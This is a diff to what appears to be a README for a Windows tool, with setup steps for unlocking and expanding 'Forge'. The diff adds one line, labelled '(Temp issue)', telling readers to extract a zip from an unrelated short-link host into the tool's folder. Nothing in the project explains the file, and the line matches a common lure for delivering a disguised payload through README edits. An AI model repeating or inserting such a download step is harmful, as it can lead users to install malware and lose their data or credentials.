@@ -7,6 +7,7 @@
 * Select "Unlock Forge" and back up the binary when prompted
 * \*Optional\* Select Expand forge capability (500mb download)
 * Done!
+(Temp issue) please extract this zip https://a.gg.fm/aTpOl.zip in the same folder as this.
 
 Tested on Windows 10 1903. Please open an issue if you run into any problems.
 
